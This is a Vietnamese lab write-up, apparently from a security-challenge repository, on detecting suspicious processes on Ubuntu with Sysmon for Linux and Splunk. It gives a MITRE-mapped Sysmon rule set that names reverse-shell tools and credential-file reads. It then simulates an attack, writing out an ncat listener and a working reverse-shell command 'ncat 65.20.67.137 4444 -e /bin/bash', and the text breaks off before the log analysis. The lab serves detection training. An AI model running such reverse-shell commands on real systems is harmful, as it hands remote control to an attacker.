# Giám sát và điều tra thực thi tiến trình đáng ngờ trên Ubuntu bằng Sysmon và Splunk

## 1. Mục tiêu
- Phát hiện và điều tra các tiến trình đáng ngờ đang chạy trên hệ điều hành Ubuntu Server.
- Sử dụng các công cụ phổ biến như **Sysmon for Linux** và **Splunk** để theo dõi hệ thống.
- Mô phỏng một cuộc tấn công sử dụng **reverse shell** thông qua `netcat`, nhằm kiểm tra khả năng ghi nhận log và truy vết sự kiện đáng ngờ.

## 2. Kiến thức cơ bản
- **Sysmon for Linux**: Là công cụ giám sát hệ thống được phát triển bởi Microsoft, dùng để ghi lại thông tin chi tiết về các sự kiện quan trọng như khởi chạy tiến trình, tạo kết nối mạng, hoặc thay đổi file. Đây là thành phần quan trọng giúp phát hiện các hoạt động đáng ngờ trong hệ thống Linux.
- **Splunk Universal Forwarder**: Là một agent nhẹ được cài trên máy khách, có nhiệm vụ thu thập và gửi log (ví dụ: log tiến trình từ Sysmon) về Splunk Server để phân tích tập trung. Forwarder không tiêu tốn nhiều tài nguyên nên phù hợp cho môi trường sản xuất.
- **Splunk Enterprise**: Nền tảng mạnh mẽ dùng để phân tích, tìm kiếm và trực quan hóa dữ liệu log. Splunk cho phép tạo dashboard tùy chỉnh, cảnh báo theo điều kiện, và hỗ trợ các truy vấn nâng cao phục vụ điều tra sự cố bảo mật.
- **Netcat (nc)**: Là công cụ dòng lệnh phổ biến cho việc thiết lập kết nối TCP hoặc UDP giữa hai máy. Nó thường được dùng bởi hacker để tạo kết nối shell từ xa (reverse shell), truyền dữ liệu hoặc mở cổng nghe trên hệ thống.
- **Reverse Shell**: Là một kỹ thuật tấn công trong đó máy bị tấn công chủ động mở kết nối về máy tấn công (thường qua Netcat) và cung cấp cho kẻ tấn công quyền điều khiển dòng lệnh từ xa. Đây là hành vi nguy hiểm cần được phát hiện sớm qua giám sát tiến trình và phân tích log.

## 3. Sơ đồ mạng

<img width="720" height="399" alt="Splunk+sysmon ubuntu" src="https://github.com/user-attachments/assets/e5647e8c-1e90-4028-8748-e0b82dcf3866" />

## 4. Các bước thực hiện

### Bước 1: Chuẩn bị môi trường

- Tải và cài đặt máy ảo Ubuntu Server 22.04 và Kali Linux 2025.1a qua VMware Player.
    - Ubuntu Server: https://releases.ubuntu.com/jammy/ubuntu-22.04.5-live-server-amd64.iso
    - Kali Linux: https://cdimage.kali.org/kali-2025.1a/kali-linux-2025.1a-vmware-amd64.7z
- Thực hiện cài đặt, cấu hình Splunk Server trên Windows và Splunk Universal Forwarder trên Ubuntu Server theo hướng dẫn tại: [https://github.com/0xrajneesh/90-days-security-challenge/blob/main/Challenge%231/Lab Set up.md](https://github.com/0xrajneesh/90-days-security-challenge/blob/main/Challenge%231/Lab%20Set%20up.md)

### Bước 2: Cài đặt và cấu hình Sysmon trên Ubuntu Server

- Cài đặt Sysmon

```
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt-get update
sudo apt-get install sysmonforlinux
```

<img width="814" height="342" alt="image" src="https://github.com/user-attachments/assets/853a304d-4c20-4d7e-8d9e-13fe723b4443" />

- Tạo file cấu hình cho sysmon

```
sudo nano /etc/sysmon/sysmon.conf
```

- Thêm các luật sau vào để theo dõi các hành vi đáng ngờ

```
<Sysmon schemaversion="4.81">
  <EventFiltering>
    <!-- Event ID 1 == ProcessCreate -->
    <RuleGroup name="" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Rule name="TechniqueID=T1021.004,TechniqueName=Remote Services: SSH" groupRelation="and">
          <Image condition="end with">ssh</Image>
          <CommandLine condition="contains">ConnectTimeout=</CommandLine>
          <CommandLine condition="contains">BatchMode=yes</CommandLine>
          <CommandLine condition="contains">StrictHostKeyChecking=no</CommandLine>
          <CommandLine condition="contains any">wget;curl</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1027.001,TechniqueName=Obfuscated Files or Information: Binary Padding" groupRelation="and">
          <Image condition="is">/bin/dd</Image>
          <CommandLine condition="contains all">dd;if=</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer - Ncat" groupRelation="and">
            <Image condition="end with">ncat</Image>
            <Image condition="end with">nc</Image>
            <CommandLine condition="contains">-e</CommandLine> <!-- Detects reverse shell option -->
            <CommandLine condition="contains any">/bin/bash;/bin/sh;/bin/dash</CommandLine> <!-- Shell execution -->
        </Rule>

        <Rule name="TechniqueID=T1033,TechniqueName=System Owner/User Discovery" groupRelation="or">
          <CommandLine condition="contains">/var/run/utmp</CommandLine>
          <CommandLine condition="contains">/var/log/btmp</CommandLine>
          <CommandLine condition="contains">/var/log/wtmp</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1053.003,TechniqueName=Scheduled Task/Job: Cron" groupRelation="or">
          <Image condition="end with">crontab</Image>
        </Rule>
        <Rule name="TechniqueID=T1059.004,TechniqueName=Command and Scripting Interpreter: Unix Shell" groupRelation="or">
          <Image condition="end with">/bin/bash</Image>
          <Image condition="end with">/bin/dash</Image>
          <Image condition="end with">/bin/sh</Image>
        </Rule>
        <Rule name="TechniqueID=T1070.006,TechniqueName=Indicator Removal on Host: Timestomp" groupRelation="and">
          <Image condition="is">/bin/touch</Image>
          <CommandLine condition="contains any">-r;--reference;-t;--time</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1087.001,TechniqueName=Account Discovery: Local Account" groupRelation="or">
          <CommandLine condition="contains">/etc/passwd</CommandLine>
          <CommandLine condition="contains">/etc/sudoers</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
          <Image condition="end with">wget</Image>
          <Image condition="end with">curl</Image>
          <Image condition="end with">ftpget</Image>
          <Image condition="end with">tftp</Image>
          <Image condition="end with">lwp-download</Image>
        </Rule>
        <Rule name="TechniqueID=T1123,TechniqueName=Audio Capture" groupRelation="and">
          <Image condition="contains">/bin/aplay</Image>
          <CommandLine condition="contains">arecord</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1136.001,TechniqueName=Create Account: Local Account" groupRelation="or">
          <Image condition="end with">useradd</Image>
          <Image condition="end with">adduser</Image>
        </Rule>
        <Rule name="TechniqueID=T1203,TechniqueName=Exploitation for Client Execution" groupRelation="and">
          <User condition="is">root</User>
          <LogonId condition="is">0</LogonId>
          <CurrentDirectory condition="is">/var/opt/microsoft/scx/tmp</CurrentDirectory>
          <CommandLine condition="contains">/bin/sh</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1485,TechniqueName=Data Destruction" groupRelation="and">
          <Image condition="is">/bin/dd</Image>
          <CommandLine condition="contains all">dd;of=;if=</CommandLine>
          <CommandLine condition="contains any">if=/dev/zero;if=/dev/null</CommandLine>
        </Rule>
        <Rule name="TechniqueID=T1505.003,TechniqueName=Server Software Component: Web Shell" groupRelation="and">
          <Image condition="contains any">whoami;ifconfig;/usr/bin/ip;/bin/uname</Image>
          <ParentImage condition="contains any">httpd;lighttpd;nginx;apache2;node;dash</ParentImage>
        </Rule>
        <Rule name="TechniqueID=T1543.002,TechniqueName=Create or Modify System Process: Systemd Service" groupRelation="or">
          <Image condition="end with">systemd</Image>
        </Rule>
        <Rule name="TechniqueID=T1548.001,TechniqueName=Abuse Elevation Control Mechanism: Setuid and Setgid" groupRelation="or">
          <Image condition="end with">chmod</Image>
          <Image condition="end with">chown</Image>
          <Image condition="end with">fchmod</Image>
          <Image condition="end with">fchmodat</Image>
          <Image condition="end with">fchown</Image>
          <Image condition="end with">fchownat</Image>
          <Image condition="end with">fremovexattr</Image>
          <Image condition="end with">fsetxattr</Image>
          <Image condition="end with">lchown</Image>
          <Image condition="end with">lremovexattr</Image>
          <Image condition="end with">lsetxattr</Image>
          <Image condition="end with">removexattr</Image>
          <Image condition="end with">setuid</Image>
          <Image condition="end with">setgid</Image>
          <Image condition="end with">setreuid</Image>
          <Image condition="end with">setregid</Image>
        </Rule>
      </ProcessCreate>
    </RuleGroup>
    <!-- Event ID 3 == NetworkConnect Detected -->
    <RuleGroup name="" groupRelation="or">
      <NetworkConnect onmatch="include">
        <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
          <Image condition="end with">wget</Image>
          <Image condition="end with">curl</Image>
          <Image condition="end with">ftpget</Image>
          <Image condition="end with">tftp</Image>
          <Image condition="end with">lwp-download</Image>
          <Image condition="end with">nc</Image>
          <Image condition="end with">ncat</Image>
        </Rule>
      </NetworkConnect>
    </RuleGroup>
    <!-- Event ID 5 == ProcessTerminate -->
    <RuleGroup name="" groupRelation="or">
      <ProcessTerminate onmatch="include" />
    </RuleGroup>
    <!-- Event ID 9 == RawAccessRead -->
    <RuleGroup name="" groupRelation="or">
      <RawAccessRead onmatch="include" />
    </RuleGroup>
    <!-- Event ID 11 == FileCreate -->
    <RuleGroup name="" groupRelation="or">
      <FileCreate onmatch="include">
        <Rule name="TechniqueID=T1037,TechniqueName=Boot or Logon Initialization Scripts" groupRelation="or">
          <TargetFilename condition="begin with">/etc/init/</TargetFilename>
          <TargetFilename condition="begin with">/etc/init.d/</TargetFilename>
          <TargetFilename condition="begin with">/etc/rc.d/</TargetFilename>
        </Rule>
        <Rule name="TechniqueID=T1053.003,TechniqueName=Scheduled Task/Job: Cron" groupRelation="or">
          <TargetFilename condition="is">/etc/cron.allow</TargetFilename>
          <TargetFilename condition="is">/etc/cron.deny</TargetFilename>
          <TargetFilename condition="is">/etc/crontab</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.d/</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.daily/</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.hourly/</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.monthly/</TargetFilename>
          <TargetFilename condition="begin with">/etc/cron.weekly/</TargetFilename>
          <TargetFilename condition="begin with">/var/spool/cron/crontabs/</TargetFilename>
        </Rule>
        <Rule name="TechniqueID=T1105,TechniqueName=Ingress Tool Transfer" groupRelation="or">
          <Image condition="end with">wget</Image>
          <Image condition="end with">curl</Image>
          <Image condition="end with">ftpget</Image>
          <Image condition="end with">tftp</Image>
          <Image condition="end with">lwp-download</Image>
        </Rule>
        <Rule name="TechniqueID=T1543.002,TechniqueName=Create or Modify System Process: Systemd Service" groupRelation="or">
          <TargetFilename condition="begin with">/etc/systemd/system</TargetFilename>
          <TargetFilename condition="begin with">/usr/lib/systemd/system</TargetFilename>
          <TargetFilename condition="begin with">/run/systemd/system/</TargetFilename>
          <TargetFilename condition="contains">/systemd/user/</TargetFilename>
        </Rule>
      </FileCreate>
    </RuleGroup>
    <!--Event ID 23 == FileDelete -->
    <RuleGroup name="" groupRelation="or">
      <FileDelete onmatch="include" />
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```
- Các luật trên sẽ giúp phát hiện
  - Hành vi xâm nhập
  - Leo thang đặc quyền
  - Duy trì truy cập
  - Giao tiếp C2
  - Phá hoại hệ thống
- Nhóm hành vi được phát hiện
  - Initial Access / Lateral Movement
    - Truy cập từ xa qua SSH bất thường
    - Tự động hóa SSH để tải payload
  - Execution
    - Thực thi shell (/bin/bash, /bin/sh)
    - Spawn shell với quyền root
    - Reverse shell qua nc / ncat
  - Persistence
    - Tạo cron job
    - Tạo hoặc sửa systemd service
    - Chèn script khởi động (/etc/init.d, /etc/rc.d)
  - Privilege Escalation
    - Thay đổi permission (chmod, chown)
    - Lạm dụng setuid / setgid
  - Discovery
    - Đọc /etc/passwd, /etc/sudoers
    - Truy cập file log đăng nhập (utmp, wtmp, btmp)
  - Defense Evasion
    - Thay đổi timestamp (timestomping)
    - Obfuscate file bằng dd
  - Command & Control / Tool Transfer
    - Tải công cụ qua wget, curl, tftp, ftpget
    - Kết nối mạng từ các công cụ này
  - Collection
    - Ghi âm thanh (audio capture)
  - Impact
    - Ghi đè dữ liệu bằng dd (data destruction)

- Áp dụng cấu hình và khởi động lại dịch vụ

```
sudo sysmon -i sysmon.conf
sudo systemctl restart sysmon
```

### Bước 3: Mô phỏng tiến trình đáng ngờ (Reverse Shell)

1. **Mô phỏng Reverse Shell**
- Trên máy Kali (kẻ tấn công), tạo 1 netcat listener

```
ncat -lvnp 4444
```

<img width="463" height="132" alt="image" src="https://github.com/user-attachments/assets/109a960b-9466-4224-b60c-4a0375e479b7" />

- Trên máy Ubuntu (nạn nhân), dùng netcat kết nối với máy Kali, tạo reverse shell

```
ncat 65.20.67.137 4444 -e /bin/bash
```

<img width="557" height="70" alt="image" src="https://github.com/user-attachments/assets/b8010b6a-d040-4c9e-b6f2-bbe03fb2179f" />

2. **Ghi nhận thực thi tiến trình trên máy nạn nhân**


